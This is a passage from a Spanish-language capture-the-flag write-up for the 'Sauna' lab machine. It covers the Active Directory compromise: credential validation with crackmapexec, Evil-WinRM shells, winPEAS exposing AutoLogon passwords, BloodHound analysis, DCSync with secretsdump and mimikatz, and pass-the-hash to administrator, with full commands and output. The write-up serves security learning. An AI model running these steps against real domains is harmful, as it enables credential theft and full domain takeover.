Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Tekotuku
Hardware.Mon.#1..: Util: 60%

Started: Wed Oct 16 16:16:07 2024
Stopped: Wed Oct 16 16:17:03 2024
```
Listo, tenemos la contraseña en texto claro.

#### Comprobando Contraseña Crackeada y Ganando Acceso a la Máquina con Evil-WinRM {#Hash1}

Ya tan solo debemos probar si la contraseña es válida.

Lo haremos con **crackmapexec**:
```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
```
Parece ser válida, pero no podremos conectarnos a la máquina.

Probemos con **WinRM**, ya que vimos que está abierto:
```bash
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

Excelente, ya solo usemos **Evil-WinRM** para entrar a la máquina:
```batch
 evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir

    Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/16/2024   6:51 PM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
```

### Enumeración de Servicio RPC {#RPC}

Como ya tenemos credenciales válidas, podemos enumerar varios servicios como **LDAP, SMB**, pero el que es más simple de enumerar (en mi opinión), es el **servicio RPC**.

La idea, es comprobar los usuarios existentes, ya que solamente contamos con 2 usuarios.

Entremos usando **rpcclient**:
```batch
rpcclient -U "fsmith%Thestrokes23" 10.10.10.175
rpcclient $>
```
Obtuvimos un acceso exitoso.

Veamos los usuarios existentes:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```
Curioso, tenemos a otro usuario llamado **svc_loanmgr**, quizá tengamos que pivotear hacia este usuario para más privilegios, pero eso lo veremos más adelante.

Veamos los grupos existentes:
```batch
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
```
No veo un grupo que podamos usar de momento.

Veamos si hay más usuarios administradores:
```batch
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 16 Oct 2024 19:51:49 CST
        Logoff Time              :      Wed, 31 Dec 1969 18:00:00 CST
        Kickoff Time             :      Wed, 31 Dec 1969 18:00:00 CST
        Password last set Time   :      Mon, 26 Jul 2021 11:16:16 CDT
        Password can change Time :      Tue, 27 Jul 2021 11:16:16 CDT
        Password must change Time:      Wed, 13 Sep 30828 20:48:05 CST
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000006e
        padding1[0..7]...
        logon_hrs[0..21]...
```
Solo hay uno.

Por último, veamos la información de los usuarios, quizá podamos ver alguna contraseña en texto claro:
```batch
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfaf RID: 0x451 acb: 0x00010210 Account: FSmith Name: Fergus Smith      Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfad RID: 0x44f acb: 0x00000210 Account: HSmith Name: Hugo Smith        Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: svc_loanmgr    Name: L Manager Desc: (null)
```
Nada, por lo menos, sabemos que existe otro usuario.

## Post Explotación {#Post}

### Enumeración de Máquina Manual y con winPEAS {#winPEAS}

Primero, vamos a enumerar un poco nuestro usuario, para ver qué privilegios tenemos y a qué grupos pertenecemos.

Veamos nuestros privilegios:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Nada que podamos usar.

Veamos toda la información de nuestro usuario:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
Nada, pero ahí comprobamos que pertenecemos al grupo **Remote Management Users (WinRM)**, que es donde nos conectamos con **Evil-WinRM**.

Veámoslo de otra forma:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user fsmith
User name                    FSmith
Full Name                    Fergus Smith
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/23/2020 9:45:19 AM
Password expires             Never
Password changeable          1/24/2020 9:45:19 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/16/2024 7:38:33 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Ahora, veamos si hay otro usuario registrado en el **WinRM**:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
FSmith
svc_loanmgr
The command completed successfully.
```
Ahí está el usuario **svc_loanmgr**.

Vamos a usar **winPEAS** para comprobar si encuentra alguna manera de escalar privilegios o de convertirnos en el usuario **svc_loanmgr**.

Aquí lo puedes descargar:
* <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20241011-2e37ba11" target="_blank">Repositorio de peass-ng: PEASS-ng - Releases</a>

Descárgalo y cárgalo a la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents\BrkPrit> upload winPEASx64.exe
                                        
Info: Uploading ../content/winPEASx64.exe to C:\Users\FSmith\Documents\BrkPrit\winPEASx64.exe
                                        
Data: 13122900 bytes of 13122900 bytes copied
                                        
Info: Upload successful!
```

Y ejecuta el **winPEAS**:
```batch
*Evil-WinRM* PS C:\Users\FSmith\Documents\BrkPrit> .\winPEASx64.exe
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                                                                                                                           
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((                                                                                                                                                                  
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                                                              
      ((((((((((((((**********/##########(((((((((((((                                                                                                                                                           
    ((((((((((((********************/#######(((((((((((                                                                                                                                                          
    ((((((((******************/@@@@@/****######((((((((((                                                                                                                                                        
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                                                                      
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                                                                     
    (((############*********/%@@@@@@@@@/************((((((((                                                                                                                                                     
    ((##################(/******/@@@@@/***************((((((                                                                                                                                                     
    ((#########################(/**********************(((((                                                                                                                                                     
    ((##############################(/*****************(((((                                                                                                                                                     
    ((###################################(/************(((((                                                                                                                                                     
    ((#######################################(*********(((((                                                                                                                                                     
    ((#######(,.***.,(###################(..***.*******(((((                                                                                                                                                     
    ((#######*(#####((##################((######/(*****(((((                                                                                                                                                     
    ((###################(/***********(##############()(((((                                                                                                                                                     
    (((#####################/*******(################)((((((                                                                                                                                                     
    ((((############################################)((((((                                                                                                                                                      
    (((((##########################################)(((((((                                                                                                                                                      
    ((((((########################################)(((((((                                                                                                                                                       
    ((((((((####################################)((((((((                                                                                                                                                        
    (((((((((#################################)(((((((((                                                                                                                                                         
        ((((((((((##########################)(((((((((                                                                                                                                                           
              ((((((((((((((((((((((((((((((((((((((                                                                                                                                                             
                 ((((((((((((((((((((((((((((((                                                                                                                                                                  

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                                                                                                 
                                                                                                                                                                                                                 
  WinPEAS-ng by @hacktricks_live
...
...
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: EGOTISTICALBANK
    SID: S-1-5-21-2966785786-3096785034-1186376766
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
...
...
...
```
Excelente, encontró la contraseña del **usuario svc_loanmng** en texto claro, aunque aparece con su nombre completo.

Vamos a comprobar si es correcta esta contraseña para ese usuario:
```bash
crackmapexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```
Parece que sí funciona.

Entonces, debería funcionar con **WinRM**:
```bash
crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

Muy bien, ya solo conectemos a ese usuario con **Evil-WinRM**:
```batch
evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```

### Enumeración de AD con BloodHound y SharpHound {#BloodH}

Si enumeramos este usuario, no encontraremos mucho, por lo que ahora sí usaremos **BloodHound y SharpHound**.

Yo usare **BloodHound 4.3.1 y SharpHound 1.1.1**.

Carga **SharpHound** a la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents\BrkPrit> upload SharpHound.exe
                                        
Info: Uploading ../content/SharpHound.exe to C:\Users\svc_loanmgr\Documents\BrkPrit\SharpHound.exe
                                        
Data: 1402880 bytes of 1402880 bytes copied
                                        
Info: Upload successful!
```

Vamos a ejecutarlo:
```batch
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents\BrkPrit> .\SharpHound.exe -c All
2024-10-16T20:16:21.3520698-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-16T20:16:21.5395688-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-16T20:16:21.5708143-07:00|INFORMATION|Initializing SharpHound at 8:16 PM on 10/16/2024
2024-10-16T20:16:21.6958147-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
2024-10-16T20:16:33.7583765-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-16T20:16:33.9301887-07:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2024-10-16T20:16:33.9770668-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-16T20:16:33.9770668-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-16T20:17:04.3366184-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-10-16T20:17:28.8989489-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-16T20:17:28.9458241-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-16T20:17:29.0552087-07:00|INFORMATION|Status: 94 objects finished (+94 1.709091)/s -- Using 42 MB RAM
2024-10-16T20:17:29.0552087-07:00|INFORMATION|Enumeration finished in 00:00:55.1266097
2024-10-16T20:17:29.1489427-07:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-16T20:17:29.1645692-07:00|INFORMATION|SharpHound Enumeration Completed at 8:17 PM on 10/16/2024! Happy Graphing!
```

Descarguemos el **archivo ZIP** para que podamos usarlo con **BloodHound**:
```batch
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents\BrkPrit> download 20241016201728_BloodHound.zip BH-Sauna.zip
                                        
Info: Downloading C:\Users\svc_loanmgr\Documents\BrkPrit\20241016201728_BloodHound.zip to BH-Sauna.zip
                                        
Info: Download successful!
```

Y carguémoslo al **BloodHound**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura6.png">
</p>

Parece que podíamos aplicar el **Kerberoasting Attack** a estos dos usuarios:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura7.png">
</p>

Pero no tenemos contraseñas válidas.

También aparece el único usuario con el que funciona el **AS-REP Roasting attack**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura13.png">
</p>

Veamos el path más corto al grupo **DOMAIN_ADMINS**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura8.png">
</p>

Parece que podemos aplicar el **DCSync Attack** con el **usuario svc_loanmgr**, pues podemos aplicarlo al dominio y parece que también al grupo **ACCOUNT_OPERATORS**.

Veamos este usuario y chequemos a qué usuarios de alto valor puede llegar:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura9.png">
</p>

En efecto, es lo principal que podemos hacer, pero hacia el dominio.

Si vamos hasta el **Outbond Object Control**, observa lo que tenemos:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura10.png">
</p>

Nuestro usuario tiene los **permisos GetChanges y GetChangesAll**, lo que nos permite aplicar el **DCSync Attack**.

Esto nos lo menciona **BloodHound**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura11.png">
</p>

Y nos menciona cómo aplicarlo con **Mimikatz**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura12.png">
</p>

Vamos a hacerlo.

### Aplicando DCSync Attack {#DCSync}

Para aplicar este ataque, tenemos dos opciones:
* Usar **Mimikatz**.
* Usar **secretsdump de impacket**.

Vamos a usar los dos.

#### Aplicando DCSync Attack con secretsdump de Impacket {#secrets}

Para esto, usaremos el **secretsdump de impacket**.

Solamente, debemos indicarle el dominio junto al **usuario svc_loanmgr** y la IP de la máquina. Cuando ejecutemos la herramienta, nos pedirá la contraseña, por lo que debemos dársela:
```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
...
...
```
Tenemos el **hash NTLM** del administrador.

#### Aplicando DCSync Attack con Mimikatz {#Mimikatz}

Primero debemos tener el **Mimikatz.exe**. Normalmente, Kali lo tiene en su versión de 32 y 64 bits, tan solo hay que buscarlo:
```bash
locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Cópialo en tu directorio de trabajo y cárgalo a la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents\BrkPrit> upload mimikatz.exe
                                        
Info: Uploading ../content/mimikatz.exe to C:\Users\svc_loanmgr\Documents\BrkPrit\mimikatz.exe
                                        
Data: 1807016 bytes of 1807016 bytes copied
                                        
Info: Upload successful!
```

Usemos el comando que nos menciona **BloodHound**, le agregaremos `exit` al final porque, si no, se seguirá ejecutando el **mimikatz.exe**:
```batch
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents\BrkPrit> .\mimikatz.exe 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/26/2021 9:16:16 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 716dbadeed0e537580d5f8fb28780d44

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
...
...
...
```
Listo, tenemos el **hash NTLM** del administrador.

#### Comprobando Hash y Ganando Acceso como Administrador Aplicando Pass-The-Hash {#Hash2}

Probemos el **hash** de la contraseña para ver si funciona:
```bash
crackmapexec smb 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
```

Funciona, comprobemos con **WinRM**:
```bash
crackmapexec winrm 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
```

Podemos usar **Evil-WinRM** para conectarnos como administrador (aunque igual lo podemos hacer con **psexec y wmiexec**):
```batch
evil-winrm -i 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/16/2024   6:51 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
...
```
Hemos completado la máquina.
